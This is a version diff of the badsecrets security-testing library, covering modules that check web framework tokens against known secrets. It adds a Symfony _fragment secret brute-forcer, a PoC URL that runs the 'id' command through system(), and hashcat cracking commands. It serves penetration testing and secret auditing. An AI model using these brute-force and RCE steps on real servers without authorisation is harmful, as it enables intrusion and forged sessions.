-    print(f"Secret: {x['description']['Secret']}")
+Symfony_SignedURL = modules_loaded["symfony_signedurl"]
 
 
 def validate_url(
     arg_value,
     pattern=re.compile(
         r"^https?://((?:[A-Z0-9_]|[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_])[\.]?)+(?:[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_]|[A-Z0-9_])(?::[0-9]{1,5})?.*$",
         re.IGNORECASE,
@@ -45,77 +31,79 @@
 ):
     if not pattern.match(arg_value):
         raise argparse.ArgumentTypeError("URL is not formatted correctly")
     return arg_value
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Check cryptographic tokens against badsecrets library")
+    parser = argparse.ArgumentParser()
     parser.add_argument(
         "-u",
         "--url",
         type=validate_url,
-        help="Use URL Mode. Specified the URL of the page to access and attempt to check for secrets",
+        help="The URL of the page to access and attempt to pull viewstate and generator from",
+        required=True,
     )
-    parser.add_argument("secret", nargs="*", type=str)
 
     parser.add_argument(
         "-p",
         "--proxy",
-        help="In URL mode, Optionally specify an HTTP proxy",
+        help="Optionally specify an HTTP proxy",
     )
 
     parser.add_argument(
         "-a",
         "--user-agent",
-        help="In URL mode, Optionally set a custom user-agent",
+        help="Optionally set a custom user-agent",
     )
 
     args = parser.parse_args()
 
-    print("badsecrets - example command line interface\n")
-
-    if not args.url and not args.secret:
-        parser.error(
-            "Either supply the secret as a positional argument (supply all secrets for multi-secret modules), or use --url mode with a valid URL"
-        )
-        return
-
-    if args.url and args.secret:
-        parser.error("In --url mode, no positional arguments should be used")
+    if not args.url:
         return
 
     proxies = None
     if args.proxy:
         proxies = {"http": args.proxy, "https": args.proxy}
 
-    if args.url:
-        headers = {}
-        if args.user_agent:
-            headers["User-agent"] = args.user_agent
-
-        try:
-            res = requests.get(args.url, proxies=proxies, headers=headers, verify=False)
-        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
-            print(f"Error connecting to URL: [{args.url}]")
-            return
-
-        r_list = carve_all_modules(requests_response=res)
-        if r_list:
-            for r in r_list:
-                if r["type"] == "IdentifyOnly":
-                    report_identify(r)
-                else:
-                    report_finding(r)
-        else:
-            print("No secrets found :(")
-
-    else:
-        x = check_all_modules(*args.secret)
-        if x:
-            report_finding(x)
-        else:
-            print("No secrets found :(")
+    headers = {}
+    if args.user_agent:
+        headers["User-agent"] = args.user_agent
+
+    fragment_test_url = f"{args.url.rstrip('/')}/_fragment"
+    try:
+        res_fragment = requests.get(f"{fragment_test_url}", proxies=proxies, headers=headers, verify=False)
+    except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
+        print(f"Error connecting to URL: [{args.url}]")
+        return
+
+    negative_test_url = f"{args.url.rstrip('/')}/AAAAAAAA"
+    res_random = requests.get(f"{negative_test_url}", proxies=proxies, headers=headers, verify=False)
+
+    if (res_fragment.status_code != 403) or not (res_random.status_code != res_fragment.status_code):
+        print(f"Not a Symfony app, or _fragment functionality not enabled...")
+        return
+
+    print("Target appears to by a Symfony app with _fragment enabled. Brute forcing Symfony secret...")
+
+    x = Symfony_SignedURL()
+
+    phpinfo_test_url = f"{args.url.rstrip('/')}/_fragment?_path=_controller%3Dphpcredits"
+
+    for l in x.load_resources(["symfony_appsecret.txt"]):
+        with suppress(ValueError):
+            secret = l.rstrip()
+            for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
+                hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
+                test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
+                test_res = requests.get(f"{test_url}", proxies=proxies, headers=headers, verify=False)
+                if "PHP Authors" in test_res.text:
+                    print(test_url)
+                    print(f"Found Symfony Secret! [{secret}]")
+                    print(f"PoC URL: {test_url}")
+                    print(f"Hash Algorithm: {hash_algorithm.__name__.split('_')[1]}")
+                    return
 
 
 if __name__ == "__main__":
+    print("badsecrets - Symfony _fragment known secret key brute-force tool\n")
     main()
```

### Comparing `badsecrets-0.2.311/badsecrets/examples/telerik_knownkey.py` & `badsecrets-0.3.347/badsecrets/examples/telerik_knownkey.py`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/helpers.py` & `badsecrets-0.3.347/badsecrets/helpers.py`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/modules/aspnet_viewstate.py` & `badsecrets-0.3.347/badsecrets/modules/aspnet_viewstate.py`

 * *Files 1% similar despite different names*

```diff
@@ -14,15 +14,15 @@
 from badsecrets.base import BadsecretsBase, generic_base64_regex
 
 
 class ASPNET_Viewstate(BadsecretsBase):
     check_secret_args = 2
 
     identify_regex = generic_base64_regex
-    description = {"Product": "ASP.NET Viewstate", "Secret": "ASP.NET MachineKey"}
+    description = {"product": "ASP.NET Viewstate", "secret": "ASP.NET MachineKey"}
 
     def carve_regex(self):
         return re.compile(
             r"<input.+__VIEWSTATE\"\svalue=\"(.+)\"[\S\s]+<input.+__VIEWSTATEGENERATOR\"\svalue=\"(\w+)\""
         )
 
     def carve_to_check_secret(self, s):
@@ -133,15 +133,15 @@
 
         generator = struct.pack("<I", int(generator, 16))
         if self.valid_preamble(base64.b64decode(viewstate_B64)):
             encrypted = False
         else:
             encrypted = True
 
-        for l in self.load_resource("aspnet_machinekeys.txt"):
+        for l in self.load_resources(["aspnet_machinekeys.txt"]):
             try:
                 vkey, ekey = l.rstrip().split(",")
             except ValueError:
                 continue
             validationAlgo = self.viewstate_validate(vkey, encrypted, viewstate_B64, generator)
             if validationAlgo:
                 confirmed_ekey = None
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/django_signedcookies.py` & `badsecrets-0.3.347/badsecrets/modules/django_signedcookies.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,22 +1,20 @@
 import re
 from django.core.signing import loads as djangoLoads, BadSignature
 from badsecrets.base import BadsecretsBase
 
 
 class DjangoSignedCookies(BadsecretsBase):
     identify_regex = re.compile(r"^[\.a-zA-z-0-9]+:[\.a-zA-z-0-9:]+$")
-    description = {"Product": "Djangno Signed Cookie", "Secret": "Django secret_key"}
+    description = {"product": "Djangno Signed Cookie", "secret": "Django secret_key"}
 
     def check_secret(self, django_signed_cookie):
         if not self.identify(django_signed_cookie):
             return False
-        for l in set(
-            list(self.load_resource("django_secret_keys.txt")) + list(self.load_resource("top_10000_passwords.txt"))
-        ):
+        for l in set(list(self.load_resources(["django_secret_keys.txt", "top_10000_passwords.txt"]))):
             secret_key = l.rstrip()
             try:
                 r = djangoLoads(
                     django_signed_cookie,
                     key=secret_key,
                     fallback_keys="",
                     salt="django.contrib.sessions.backends.signed_cookies",
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/express_signedcookies.py` & `badsecrets-0.3.347/badsecrets/modules/express_signedcookies.py`

 * *Files 6% similar despite different names*

```diff
@@ -13,15 +13,15 @@
 
 def no_padding_urlsafe_base64_encode(enc):
     return base64.urlsafe_b64encode(enc).decode().rstrip("=").replace("-", "+").replace("_", "/")
 
 
 class ExpressSignedCookies(BadsecretsBase):
     identify_regex = re.compile(r"^s%3[Aa][^\.]+\.[a-zA-Z0-9%]{20,90}$")
-    description = {"Product": "Express.js Signed Cookie", "Secret": "Express.js SESSION_SECRET"}
+    description = {"product": "Express.js Signed Cookie", "secret": "Express.js SESSION_SECRET"}
 
     def carve_regex(self):
         return re.compile(r"(s%3[Aa][^\.]+\.[a-zA-Z0-9%]{20,90})")
 
     def expressHMAC(self, payload, secret, hash_algorithm):
         return no_padding_urlsafe_base64_encode(hmac.HMAC(secret.encode(), payload.encode(), hash_algorithm).digest())
 
@@ -39,17 +39,15 @@
                         "hash algorithm": hash_algorithm.__name__.split("openssl_")[1],
                     }
         return False
 
     def check_secret(self, express_signed_cookie):
         if not self.identify(express_signed_cookie):
             return False
-        for l in set(
-            list(self.load_resource("express_session_secrets.txt"))
-            + list(self.load_resource("top_10000_passwords.txt"))
-        ):
+
+        for l in set(list(self.load_resources(["express_session_secrets.txt", "top_10000_passwords.txt"]))):
             session_secret = l.rstrip()
 
             r = self.expressVerify(express_signed_cookie, session_secret)
 
             if r:
                 return {"secret": session_secret, "details": r}
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/flask_signedcookies.py` & `badsecrets-0.3.347/badsecrets/modules/flask_signedcookies.py`

 * *Files 12% similar despite different names*

```diff
@@ -3,20 +3,26 @@
 import re
 from flask_unsign import verify as flaskVerify
 from badsecrets.base import BadsecretsBase
 
 
 class Flask_SignedCookies(BadsecretsBase):
     identify_regex = re.compile(r"eyJ(?:[\w-]*\.)(?:[\w-]*\.)[\w-]*")
-    description = {"Product": "Flask Signed Cookie", "Secret": "Flask Password"}
+    description = {"product": "Flask Signed Cookie", "secret": "Flask Password"}
 
     def check_secret(self, flask_cookie):
         if not self.identify(flask_cookie):
             return None
-        for l in set(
-            list(self.load_resource("flask_secret_keys.txt")) + list(self.load_resource("top_10000_passwords.txt"))
-        ):
+        for l in set(list(self.load_resources(["flask_secret_keys.txt", "top_10000_passwords.txt"]))):
             password = l.rstrip()
             r = flaskVerify(value=flask_cookie, secret=password)
             if r:
                 return {"secret": password, "details": r}
         return None
+
+    def get_hashcat_commands(self, flask_cookie):
+        return [
+            {
+                "command": f"hashcat -m 29100 -a 0 {flask_cookie} <dictionary_file>",
+                "description": f"Flask Signed Cookie",
+            }
+        ]
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/generic_jwt.py` & `badsecrets-0.3.347/badsecrets/modules/generic_jwt.py`

 * *Files 23% similar despite different names*

```diff
@@ -20,15 +20,15 @@
     "http://www.w3.org/2007/05/xmldsig-more#sha384-rsa-MGF1": "PS384",
     "http://www.w3.org/2007/05/xmldsig-more#sha512-rsa-MGF1": "PS512",
 }
 
 
 class Generic_JWT(BadsecretsBase):
     identify_regex = re.compile(r"eyJ(?:[\w-]*\.)(?:[\w-]*\.)[\w-]*")
-    description = {"Product": "JSON Web Token (JWT)", "Secret": "HMAC/RSA Key"}
+    description = {"product": "JSON Web Token (JWT)", "secret": "HMAC/RSA Key"}
 
     @staticmethod
     def swap_algorithm(jwt, algorithm):
         header = j.get_unverified_header(jwt)
         header["alg"] = algorithm
         header_encoded = (
             base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
@@ -43,48 +43,66 @@
     def jwtVerify(self, JWT, key, algorithm):
         try:
             r = j.decode(JWT, key, algorithms=[algorithm], options={"verify_exp": False})
             return r
         except j.exceptions.InvalidSignatureError:
             return None
 
-    def check_secret(self, JWT):
-        if not self.identify(JWT):
-            return None
-
+    def jwtLoad(self, JWT):
         try:
             jwt_headers = j.get_unverified_header(JWT)
-
         # if the JWT is not well formed, stop here
         except j.exceptions.DecodeError:
-            return None
-
+            return (None, None, None)
         try:
             algorithm = jwt_headers["alg"]
 
         # It could be a JWT-like token that is actually a different format, for example a flask cookie
         except KeyError:
-            return None
+            return (None, None, None)
 
         if algorithm in XMLDSIG_table.keys():
             algorithm = XMLDSIG_table[algorithm]
             JWT = self.swap_algorithm(JWT, algorithm)
 
+        return jwt_headers, algorithm, JWT
+
+    def get_hashcat_commands(self, JWT):
+        jwt_headers, algorithm, JWT = self.jwtLoad(JWT)
+        if jwt_headers and algorithm and JWT:
+            if algorithm[0].lower() != "h":
+                return None
+
+            return [
+                {
+                    "command": f"hashcat -m 16500 -a 0 {JWT}  <dictionary_file>",
+                    "description": f"JSON Web Token (JWT) Algorithm: {algorithm}",
+                }
+            ]
+
+    def check_secret(self, JWT):
+        if not self.identify(JWT):
+            return None
+
+        jwt_headers, algorithm, JWT = self.jwtLoad(JWT)
+        if not jwt_headers or not algorithm or not JWT:
+            return None
+
         if algorithm[0].lower() == "h":
-            for l in self.load_resource("jwt_secrets.txt"):
+            for l in self.load_resources(["jwt_secrets.txt"]):
                 key = l.strip()
 
                 r = self.jwtVerify(JWT, key, algorithm)
                 if r:
                     r["jwt_headers"] = jwt_headers
 
                     return {"secret": key, "details": r}
 
         elif algorithm[0].lower() == "r":
-            for l in self.load_resource("jwt_rsakeys_public.txt"):
+            for l in self.load_resources(["jwt_rsakeys_public.txt"]):
                 private_key_name = l.split(":")[0]
                 public_key = f"{l.split(':')[1]}".rstrip().encode().replace(b"\\n", b"\n")
                 r = self.jwtVerify(JWT, public_key, algorithm)
                 r["jwt_headers"] = jwt_headers
                 if r:
                     return {"secret": f"Private key Name: {private_key_name}", "details": r}
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/jsf_viewstate.py` & `badsecrets-0.3.347/badsecrets/modules/jsf_viewstate.py`

 * *Files 9% similar despite different names*

```diff
@@ -4,22 +4,26 @@
 import base64
 import hashlib
 import binascii
 import urllib.parse
 from Crypto.Cipher import DES3, AES, DES
 from Crypto.Util.Padding import unpad
 from badsecrets.helpers import Java_sha1prng
-from badsecrets.base import BadsecretsBase, generic_base64_regex
+from badsecrets.base import BadsecretsBase
 
 
 class Jsf_viewstate(BadsecretsBase):
     myfaces_candidate_decryption_algorithms = [DES3, AES, DES]
 
-    identify_regex = generic_base64_regex
-    description = {"Product": "Java Server Faces Viewstate", "Secret": "com.sun.faces.ClientStateSavingPassword"}
+    identify_regex = re.compile(
+        r"^(?:[%A-Za-z0-9+\/]{4}){8,}(?:[%A-Za-z0-9+\/]{4}|[%A-Za-z0-9+\/]{3}=|[%A-Za-z0-9+\/]{2}={2})$"
+    )
+    description = {"product": "Java Server Faces Viewstate", "secret": "com.sun.faces.ClientStateSavingPassword"}
+
+    hashcat_hashalg_table = {"MD5": "50", "SHA1": "150", "SHA256": "1450", "SHA384": "10800", "SHA512": "1750"}
 
     @staticmethod
     def attempt_decompress(value):
         try:
             uncompressed = gzip.decompress(base64.b64decode(value))
         except (gzip.BadGzipFile, binascii.Error, ValueError):
             return False
@@ -170,15 +174,44 @@
 
         # The decryption key was valid, but the first block was not - this indicates that the mode is CBC and the IV is incorrect
         if invalid_iv_match:
             return invalid_iv_match
         else:
             return (None, None, None, None, None)
 
+    def get_hashcat_commands(self, jsf_viewstate_value):
+        commands = []
+        decoded_viewstate = base64.b64decode(urllib.parse.unquote(jsf_viewstate_value))
+        sig = decoded_viewstate[:32]
+        data = decoded_viewstate[32:]
+
+        candidate_hash_algs = list(self.hash_sizes.keys())
+        for hash_alg in candidate_hash_algs:
+            data = decoded_viewstate[: -self.hash_sizes[hash_alg]]
+            sig = decoded_viewstate[-self.hash_sizes[hash_alg] :]
+
+            description = f"HashAlg: [{hash_alg}] Implementation: [Myfaces"
+            if hash_alg == "SHA256":
+                description += " / Mojarra 2.2.6 - 2.3.x]"
+            else:
+                description += "]"
+
+            commands.append(
+                {
+                    "command": f"hashcat -m {self.hashcat_hashalg_table[hash_alg]} -a 0 {sig.hex()}:{data.hex()} --hex-salt path/to/dictionary.txt",
+                    "description": description,
+                }
+            )
+
+        return commands
+
     def check_secret(self, jsf_viewstate_value):
+        if not self.identify(jsf_viewstate_value):
+            return None
+
         jsf_viewstate_value = urllib.parse.unquote(jsf_viewstate_value)
 
         if jsf_viewstate_value.startswith("rO0"):
             return {
                 "secret": "UNPROTECTED",
                 "details": {
                     "source": jsf_viewstate_value,
@@ -197,30 +230,28 @@
                         "info": "JSF Viewstate (Unprotected, Compressed)",
                         "compression": True,
                     },
                 }
             else:
                 jsf_viewstate_value = base64.b64encode(uncompressed)
 
-        for l in list(self.load_resource("jsf_viewstate_passwords.txt")) + list(
-            self.load_resource("top_10000_passwords.txt")
-        ):
+        for l in set(list(self.load_resources(["jsf_viewstate_passwords.txt", "top_10000_passwords.txt"]))):
             password = l.rstrip()
             if self.DES3_decrypt(jsf_viewstate_value, password):
                 return {
                     "secret": password,
                     "details": {
                         "source": jsf_viewstate_value,
                         "info": "JSF Viewstate (Mojarra 1.2.x - 2.0.3) 3DES Encrypted",
                         "compression": True if uncompressed else False,
                     },
                 }
 
         # Mojarra decryption
-        for l in self.load_resource("jsf_viewstate_passwords_b64.txt"):
+        for l in self.load_resources(["jsf_viewstate_passwords_b64.txt"]):
             password_bytes = base64.b64decode(l.rstrip())
             decrypted = self.AES_decrypt(jsf_viewstate_value, password_bytes)
 
             if decrypted:
                 uncompressed = self.attempt_decompress(base64.b64encode(decrypted))
                 if uncompressed:
                     if b"java." in uncompressed:
@@ -248,15 +279,15 @@
 
         try:
             ct_bytes = base64.b64decode(jsf_viewstate_value)
         except (binascii.Error, ValueError):
             return False
 
         # Attempt to solve mac_key
-        for l in self.load_resource("jsf_viewstate_passwords_b64.txt"):
+        for l in self.load_resources(["jsf_viewstate_passwords_b64.txt"]):
             password_bytes = base64.b64decode(l.rstrip())
             myfaces_solved_mac_key, myfaces_solved_mac_algo = self.myfaces_mac(ct_bytes, password_bytes)
             if myfaces_solved_mac_key:
                 break
 
         # Attempt to solve encryption_key
         dec_algos = set()
@@ -266,15 +297,15 @@
             for algo in self.myfaces_candidate_decryption_algorithms:
                 if (len(ct_bytes) - hash_size) % algo.block_size == 0:
                     dec_algos.add(algo)
         else:
             dec_algos = set(self.myfaces_candidate_decryption_algorithms)
             hash_sizes = self.hash_sizes.values()
 
-        for l in self.load_resource("jsf_viewstate_passwords_b64.txt"):
+        for l in self.load_resources(["jsf_viewstate_passwords_b64.txt"]):
             password_bytes = base64.b64decode(l.rstrip())
             (
                 myfaces_solved_decryption_key,
                 myfaces_solved_decryption_algo,
                 myfaces_solved_decryption_mode,
                 myfaces_solved_decryption_iv,
                 compression,
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/laravel_signedcookies.py` & `badsecrets-0.3.347/badsecrets/modules/laravel_signedcookies.py`

 * *Files 2% similar despite different names*

```diff
@@ -20,15 +20,15 @@
         if mac == hmac.new(raw_secret, iv + value, hashlib.sha256).hexdigest():
             aes_crypt = AES.new(key=raw_secret, mode=AES.MODE_CBC, IV=base64.b64decode(iv))
             decrypted = unpad(aes_crypt.decrypt(base64.b64decode(value)))
             return decrypted
         return None
 
     identify_regex = re.compile(r"eyJ(?:[\w-])*")
-    description = {"Product": "Laravel Signed Cookie", "Secret": "Laravel APP_KEY"}
+    description = {"product": "Laravel Signed Cookie", "secret": "Laravel APP_KEY"}
 
     def laravelVerify(self, value, secret):
         # attempt to decode laravel cookie and load contents into JSON object
         try:
             json_value = json.loads(base64.b64decode(urllib.parse.unquote(value)))
 
             if not all(key in json_value.keys() for key in ["mac", "value", "iv"]):
@@ -46,13 +46,13 @@
                     return {"decryptedData": decryptedData.decode()}
         return False
 
     def check_secret(self, laravel_signed_cookie):
         if not self.identify(laravel_signed_cookie):
             return None
 
-        for l in self.load_resource("laravel_app_keys.txt"):
+        for l in self.load_resources(["laravel_app_keys.txt"]):
             app_key = l.rstrip()
             r = self.laravelVerify(value=laravel_signed_cookie, secret=app_key)
             if r:
                 return {"secret": app_key, "details": r}
         return None
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/rails_secretkeybase.py` & `badsecrets-0.3.347/badsecrets/modules/rails_secretkeybase.py`

 * *Files 2% similar despite different names*

```diff
@@ -8,15 +8,15 @@
 from Crypto.Util.Padding import unpad
 from Crypto.Protocol.KDF import PBKDF2
 from badsecrets.base import BadsecretsBase
 
 
 class Rails_SecretKeyBase(BadsecretsBase):
     identify_regex = re.compile(r"^[\.a-zA-z-0-9\%=]{32,}--[\.a-zA-z-0-9%=]{16,}$")
-    description = {"Product": "Rails Signed Cookie", "Secret": "Rails secret_key_base"}
+    description = {"product": "Rails Signed Cookie", "secret": "Rails secret_key_base"}
 
     def rails(self, rails_cookie, secret_key_base):
         split_rails_cookie = urllib.parse.unquote(rails_cookie).split("--")
         data = split_rails_cookie[0]
 
         # Cookie is likely signed but not encrypted
         if split_rails_cookie[0].startswith("eyJ"):
@@ -61,13 +61,13 @@
                 return {"json_data": json_data, "encryption_algorithm": "AES_GCM"}
             except ValueError:
                 return None
 
     def check_secret(self, rails_cookie):
         if not self.identify(rails_cookie):
             return None
-        for l in self.load_resource("rails_secret_key_base.txt"):
+        for l in self.load_resources(["rails_secret_key_base.txt"]):
             secret_key_base = l.rstrip()
             r = self.rails(rails_cookie, secret_key_base)
             if r:
                 return {"secret": secret_key_base, "details": r}
         return None
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/symfony_signedurl.py` & `badsecrets-0.3.347/badsecrets/modules/symfony_signedurl.py`

 * *Files 16% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 from badsecrets.base import BadsecretsBase
 
 # Special thanks to Ambionics Security for their blog post: https://www.ambionics.io/blog/symfony-secret-fragment
 
 
 class Symfony_SignedURL(BadsecretsBase):
     identify_regex = re.compile(r"http(?:s)?:\/\/[^\/]+\/_fragment[^\s]+_hash=[\/a-zA-z-0-9\+=%]{24,132}")
-    description = {"Product": "Symfony Signed URL", "Secret": "Symfony APP_SECRET"}
+    description = {"product": "Symfony Signed URL", "secret": "Symfony APP_SECRET"}
 
     def carve_regex(self):
         return re.compile(r"(http(?:s)?:\/\/[^\/]+\/_fragment[^\s]+_hash=[\/a-zA-z-0-9\+=%]{24,132})")
 
     def symfonyHMAC(self, url, secret, hash_algorithm):
         return base64.b64encode(hmac.HMAC(secret.encode(), url.encode(), hash_algorithm).digest())
 
@@ -23,27 +23,51 @@
         poc_string = "_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
         full_url = f"{host}{poc_string}"
         poc_hash = self.symfonyHMAC(full_url, secret, hash_algorithm)
         poc_url = f"{full_url}&_hash={poc_hash.decode()}"
         return poc_url
 
     def symfonyVerify(self, value, secret):
+        url, url_hash, hash_algorithm = self.symfonyLoad(value)
+
+        generated_hash = self.symfonyHMAC(url, secret, hash_algorithm)
+        if generated_hash == url_hash.encode():
+            return {
+                "hash algorithm": hash_algorithm.__name__.split("openssl_")[1],
+                "PoC URL (executes 'id')": self.symfonyPoC(secret, url, hash_algorithm),
+            }
+        return False
+
+    def symfonyLoad(self, value):
         url, url_hash = value.split("&_hash=")
         for hash_algorithm_str in self.search_dict(self.hash_sizes, len(base64.b64decode(url_hash))):
             hash_algorithm = self.hash_algs[hash_algorithm_str]
-            generated_hash = self.symfonyHMAC(url, secret, hash_algorithm)
-            if generated_hash == url_hash.encode():
-                return {
-                    "hash algorithm": hash_algorithm.__name__.split("openssl_")[1],
-                    "PoC URL (executes 'id')": self.symfonyPoC(secret, url, hash_algorithm),
+        return url, url_hash, hash_algorithm
+
+    def get_hashcat_commands(self, signed_url):
+        url, url_hash, hash_algorithm = self.symfonyLoad(signed_url)
+        hash_algorithm_str = hash_algorithm.__name__.split("_")[1]
+        hashcat_mode = None
+
+        if hash_algorithm_str == "sha1":
+            hashcat_mode = "150"
+
+        elif hash_algorithm_str == "sha256":
+            hashcat_mode = "1450"
+
+        if hashcat_mode:
+            return [
+                {
+                    "command": f"hashcat -m {hashcat_mode} -a 0 {base64.b64decode(url_hash).hex()}:{url.encode().hex()} --hex-salt  <dictionary_file>",
+                    "description": f"Symfony Signed URL Algorithm: [{hash_algorithm_str }]",
                 }
-        return False
+            ]
 
     def check_secret(self, signed_url):
         if not self.identify(signed_url):
             return None
-        for l in self.load_resource("symfony_appsecret.txt"):
+        for l in self.load_resources(["symfony_appsecret.txt"]):
             password = l.rstrip()
             r = self.symfonyVerify(value=signed_url, secret=password)
             if r:
                 return {"secret": password, "details": r}
         return None
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/telerik_encryptionkey.py` & `badsecrets-0.3.347/badsecrets/modules/telerik_encryptionkey.py`

 * *Files 2% similar despite different names*

```diff
@@ -13,27 +13,27 @@
 from badsecrets.errors import Telerik_EncryptionKey_Exception
 
 telerik_hardcoded_salt = [58, 84, 91, 25, 10, 34, 29, 68, 60, 88, 44, 51, 1]
 
 
 class Telerik_EncryptionKey(BadsecretsBase):
     identify_regex = re.compile(r"^(?:[A-Za-z0-9+\/=%]{32,})$")
-    description = {"Product": "Telerik DialogParameters", "Secret": "Telerik.Web.UI.DialogParametersEncryptionKey"}
+    description = {"product": "Telerik DialogParameters", "secret": "Telerik.Web.UI.DialogParametersEncryptionKey"}
 
     def carve_regex(self):
         return re.compile(r"{\"SerializedParameters\":\"([^\"]*)\"")
 
     def prepare_keylist(self, include_machinekeys=False):
         if include_machinekeys:
-            for l in self.load_resource("aspnet_machinekeys.txt"):
+            for l in self.load_resources(["aspnet_machinekeys.txt"]):
                 with suppress(ValueError):
                     vkey, ekey = l.rstrip().split(",")
                     if ekey:
                         yield ekey
-        for l in self.load_resource("telerik_encryption_keys.txt"):
+        for l in self.load_resources(["telerik_encryption_keys.txt"]):
             ekey = l.strip()
             yield ekey
 
     def telerik_derivekeys(self, ekey, key_derive_mode):
         if key_derive_mode == "PBKDF1_MS":
             return self.telerik_derivekeys_PBKDF1_MS(ekey)
         elif key_derive_mode == "PBKDF2":
```

### Comparing `badsecrets-0.2.311/badsecrets/modules/telerik_hashkey.py` & `badsecrets-0.3.347/badsecrets/modules/telerik_hashkey.py`

 * *Files 17% similar despite different names*

```diff
@@ -5,46 +5,67 @@
 import urllib.parse
 from contextlib import suppress
 from badsecrets.base import BadsecretsBase
 
 
 class Telerik_HashKey(BadsecretsBase):
     identify_regex = re.compile(r"^(?:[A-Za-z0-9+\/=%]{32,})$")
-    description = {"Product": "Telerik DialogParameters", "Secret": "Telerik.Upload.ConfigurationHashKey"}
+    description = {"product": "Telerik DialogParameters", "secret": "Telerik.Upload.ConfigurationHashKey"}
 
     def carve_regex(self):
         return re.compile(r"{\"SerializedParameters\":\"([^\"]*)\"")
 
     def prepare_keylist(self, include_machinekeys=True):
         if include_machinekeys:
-            for l in self.load_resource("aspnet_machinekeys.txt"):
+            for l in self.load_resources(["aspnet_machinekeys.txt"]):
                 try:
                     vkey, ekey = l.rstrip().split(",")
                     yield vkey
                 except ValueError:
                     continue
-        for l in self.load_resource("telerik_hash_keys.txt"):
+        for l in self.load_resources(["telerik_hash_keys.txt"]):
             vkey = l.strip()
             yield vkey
 
+    @classmethod
+    def telerik_hashkey_load(self, dialogParameters_raw):
+        dialogParametersB64 = urllib.parse.unquote(dialogParameters_raw)
+        return dialogParametersB64[:-44].encode(), dialogParametersB64[-44:].encode()
+
     def check_secret(self, dialogParameters_raw):
         if not self.identify(dialogParameters_raw):
             return None
 
-        dialogParametersB64 = urllib.parse.unquote(dialogParameters_raw)
-        dp_enc = dialogParametersB64[:-44].encode()
-        dp_hash = dialogParametersB64[-44:].encode()
+        dp_enc, dp_hash = self.telerik_hashkey_load(dialogParameters_raw)
 
         for vkey in self.prepare_keylist():
             with suppress(binascii.Error):
                 h = hmac.new(vkey.encode(), dp_enc, self.hash_algs["SHA256"])
                 if base64.b64encode(h.digest()) == dp_hash:
                     return {"secret": vkey, "details": None}
         return None
 
+    def get_hashcat_commands(self, dialogParameters_raw):
+        dp_enc, dp_hash = self.telerik_hashkey_load(dialogParameters_raw)
+        if not dp_enc or not dp_hash:
+            return None
+
+        try:
+            dp_enc_decoded = base64.b64decode(dp_hash)
+            dp_hash_decoded = base64.b64decode(dp_enc)
+        except binascii.Error:
+            return None
+
+        return [
+            {
+                "command": f"hashcat -m 1450 -a 0 {dp_enc_decoded.hex()}:{dp_hash_decoded.hex()} --hex-salt <dictionary_file>",
+                "description": f"Telerik Hash Key Signature",
+            }
+        ]
+
     def hashkey_probe_generator(self, include_machinekeys=False):
         test_string = b"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CgoKCkZhbHNlCjAKCgoK;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxOC4xLjExNy40NSwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False"
         dp_enc = base64.b64encode(test_string)
         for vkey in self.prepare_keylist(include_machinekeys=include_machinekeys):
             h = hmac.new(vkey.encode(), dp_enc, self.hash_algs["SHA256"])
             yield (f"{dp_enc.decode()}{base64.b64encode(h.digest()).decode()}", vkey)
```

### Comparing `badsecrets-0.2.311/badsecrets/resources/aspnet_machinekeys.txt` & `badsecrets-0.3.347/badsecrets/resources/aspnet_machinekeys.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/django_secret_keys.txt` & `badsecrets-0.3.347/badsecrets/resources/django_secret_keys.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/express_session_secrets.txt` & `badsecrets-0.3.347/badsecrets/resources/express_session_secrets.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/flask_secret_keys.txt` & `badsecrets-0.3.347/badsecrets/resources/flask_secret_keys.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/jsf_viewstate_passwords_b64.txt` & `badsecrets-0.3.347/badsecrets/resources/jsf_viewstate_passwords_b64.txt`

 * *Files identical despite different names*

### Comparing `badsecrets-0.2.311/badsecrets/resources/jwt_rsakeys_private.txt` & `badsecrets-0.3.347/badsecrets/resources/jwt_rsakeys_private.txt`

